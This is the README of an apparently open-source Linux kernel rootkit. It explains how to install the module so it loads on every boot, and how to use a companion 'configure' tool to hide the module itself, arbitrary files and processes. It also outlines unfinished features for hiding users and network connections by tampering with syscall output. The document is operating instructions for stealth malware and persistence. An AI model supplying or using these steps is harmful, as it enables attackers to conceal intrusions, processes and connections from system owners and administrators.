# Rootkit
Simple configurable Rootkit

## installation
The installation tool builds the rootkit itself an cleans up afterwards. After the installation, the rootkit will be present on every reboot.
```
$ sudo ./install.sh
```

The installation script copies the ko file into `/lib/modules/$(uname -r)/`, where the kernel finds its modules. Furthermore, it registers the rootkit module by writing its name into `/etc/modules-load.d/rootkit.conf`. This way the kernel loads it on bootup.

Additionally, the script installs the `configure` tool to `/usr/bin/`.

## Usage
After installation, you can use the `configure` tool to configure your rootkit. The tool opens a netlink socket to send commands to the rootkit.

Hide rootkit
```
$ configure hidemodule
```

`hidemodule` removes itself from the list of loaded modules. This list is a linkedlist inside the kernel.

Unhide rootkit
```
$ configure showmodule
```

`showmodule` simply puts the entry back into the list.

You can hide arbitrary files
```
$ configure hidefile <absolute path>
```

`hidefile` determines the inode of the given path and puts it into a linked list. The `getdents64` syscall looks through the list and returns -1 if the inode requested is in the list.

And unhide then
```
$ configure showfile <absolute path>
```
`showfile` simply removes the inode from the list, so that `getdents64` does not skip it anymore.

You can hide arbitrary processes
```
$ configure hidepid <pid>
```
Process details are stored inside `/proc/<pid>`. Instead of reinventing the wheel. `hidepid` hides the corresponding folder. 


As well as unhide them
```
$ configure showpid <pid>
```
`showpid` unhides the process filder.


## Not implemented

Those features don't work because of weird behavior. If possible, please help to debug and reach out to me (email, or merge request to [rootkit.ko](https://github.com/b3ny4/rootkit.ko)).

Hide arbitrary users
```
$ configure hideuser <username>
```
`hideuser` inserts the username in a linked list. The `read` syscall matches two conditions. First, the requesting process must be lastlog. Secondly, the requested file must be `/etc/passwd`. If goes through the file and removes everything starting with a username in the list, until the new line character.

There is code, but the linkedlist seems to crash the kernel altho the function doing so is never called. The above algorithm works, if I match against a fixed username. I was not able to debug it yet, so here is what I would have done:
 - only check for the username if the previous character was a newline, or `i==0`. This way I don't discard half a line if the username appears in the gecco or somewhere else
 - check that the character after the username is `:` to not hide users beginning with a hidden username.

Unhide arbitrary users
```
$ configure showuser <username>
```
This command simply removes the username from the list

Hide arbitrary connections from netstat -antu
```
$ configure hideport <protocol> <porttype> <port>
```
Similar to `hideuser`, There must be a list of the hiding protocol, porttype and port. `netstat` looks in `/proc/net/<protocol>`. Then again, the read syscall matches for `netstat` being the requester and the requestet file. It looks at the `local_address` for `dport` or `remote_address` for `sport`. The hexadecimal number after the collon is the port. If the port matches as well, we discard the line.

Unhide connections
```
$ configure showport <protocol> <porttype> <port>
```
Simply removes the touple from the list.

## Uninstall
The uninstallation tool simply removes the rootkit from the system. Possible changes to the system won't recover until the next reboot!

```
$ sudo ./uninstall.sh
```


## Manually Installation
First build the rootkit using the `make` tool.

```
$ make
```

To install the rootkit, you have to copy it to the kernel module folder.

```
$ sudo cp rootkit.ko /lib/modules/$(uname -r)/
```

Once the module is installed, register it to load at bootup

```
$ echo "rootkit" | sudo tee /etc/modules-load.d/rootkit.conf > /dev/null
```

Now, you can clean up using the `make` tool.

```
$ make clean
```

Finally, you have to create a dependency map.

```
$ sudo depmod
```

[Optional] Either reboot your PC, or load the rootkit manually so it is available immediately.

```
$ sudo /usr/lib/systemd/systemd-modules-load /etc/modules-load.d/rootkit.conf
```

## Manually Uninstall

First unload the rootkit

```
$ sudo rmmod rootkit
```

Remove the rootkit from the modules list

```
$ sudo rm /etc/modules-load.d/rootkit.conf
```

Remove the rootkit from the modules

```
$ sudo rm /lib/modules/$(uname -r)/rootkit.ko
```